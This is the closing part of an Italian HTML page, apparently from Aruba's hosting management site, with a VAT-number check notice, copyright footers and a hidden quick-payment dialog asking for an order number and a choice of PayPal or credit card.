			<p>Attenzione, verificare che la Ragione Sociale corrisponda alla Partiva Iva visualizzata.</p>
			<input onclick="javascript: return Unblock();" type="button" value="Ok" /></div>
			</div>
			</td>
			<td valign="top" width="5"><img height="5" src="https://managehosting.aruba.it/image_main/main_separatore_5_5.gif" width="5" /></td>
		</tr>
	</tbody>
</table>

<p>&nbsp;</p>

<table border="0" cellpadding="0" cellspacing="0" width="100%">
	<tbody>
		<tr>
			<td class="separatore_5_orizzontale">&nbsp;</td>
		</tr>
		<tr>
			<td width="100%"><!--<div class="footer">
				<img src="https://managehosting.aruba.it/images/grayLineFull.png" alt="greyLine" />
				
					<img src="https://managehosting.aruba.it/images/logo-aruba-group.png" alt="logo" class="arubaGroupLogo" /><span class="copyrightBottomDescription">Copyright &copy;2017 Aruba S.p.A.- P.I. 01573850516 - All rights reserved </span>

               
				<img src="https://managehosting.aruba.it/images/grayLineFull.png" alt="greyLine" />
			</div>--><!--        <div class="footer">

<span style="border-top: 1px solid #CCC;  display: inline-block;  width: 10%;  max-width: 200px;  min-width: 50px;  margin-left: 4px;  margin-right: 4px;">&nbsp;</span>
				<img src="https://managehosting.aruba.it/images/logo-aruba-group.png" alt="logo"  class="arubaGroupLogo"  /><span class="copyrightBottomDescription">Copyright &copy; 2017 Aruba S.p.A.- P.I. 01573850516 - All rights reserved</span>

                <span style="border-top: 1px solid #CCC;  display: inline-block;  width: 10%;  max-width: 200px;  min-width: 50px;  margin-left: 4px;  margin-right: 4px;">&nbsp;</span>
		</div>-->
			<div class="footer"><img alt="greyLine" src="https://managehosting.aruba.it/images/grayLineFull.png" /> <span class="copyrightBottomDescription">Copyright &copy;2019&nbsp; S.p.A.- P.I. 01573850516 - All rights reserved </span> <img alt="greyLine" src="https://managehosting.aruba.it/images/grayLineFull.png" /></div>
			</td>
		</tr>
	</tbody>
</table>

<div aria-labelledby="ui-dialog-title-dlgMessagePagRapido" class="ui-dialog ui-widget ui-widget-content ui-corner-all  ui-draggable" role="dialog" style="display: none; position: absolute; overflow: hidden; z-index: 1000; outline: 0px;" tabindex="-1">
<div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix" unselectable="on"><span class="ui-dialog-title" id="ui-dialog-title-dlgMessagePagRapido" unselectable="on"><span style="margin-left: 10px; font-size: 16px;" unselectable="on">Pagamento Rapido</span></span><a class="ui-dialog-titlebar-close ui-corner-all" href="#" role="button" unselectable="on"><span class="ui-icon ui-icon-closethick" unselectable="on">close</span></a></div>

<div class="ui-dialog-content ui-widget-content" id="dlgMessagePagRapido">
<form id="myformPagamRapido" name="myformPagamRapido" onsubmit="return OnSubmitForm();"><input name="Lingua" type="hidden" value="IT" />
<table cellpadding="0" cellspacing="2" style="margin-top: 20px; margin-bottom: 10px;" width="100%">
	<tbody>
		<tr style="height: 40px;">
			<td align="right" width="50%">Inserisci il numero Ordine:<br />
			(es. 987654 o MO9876)</td>
			<td align="left" width="50%"><input id="IDOrdine" maxlength="10" name="IDordine" size="20" style="height: 18px;" type="text" /></td>
		</tr>
		<tr style="height: 60px;">
			<td align="right" width="50%">Modalit&agrave; di pagamento:</td>
			<td align="left" width="50%"><select name="TipoPagamento" style="height: 22px; width: 144px;"><option id="Opt" selected="selected">Scegli</option><option id="OptPayPal" value="PP">Paypal</option><option id="OptBancaSella" value="CC">Carta di credito</option> <!-- Added By Nitin --> <!--<option id="OptPayPal" value="PP">Paypal</option>
                        <option id="OptBancaSella" value="CC">Carta di credito</option>--> </select></td>
		</tr>
	</tbody>
</table>
</form>

<div id="divError" style="display:none;">&nbsp;</div>

<div style="text-align: right; margin-right: 24px;"><a class="buttonGreen" href="#" onclick="javascript:$('#myformPagamRapido').submit();"><span>PROCEDI</span></a></div>
</div>
</div>
</body>
</html>
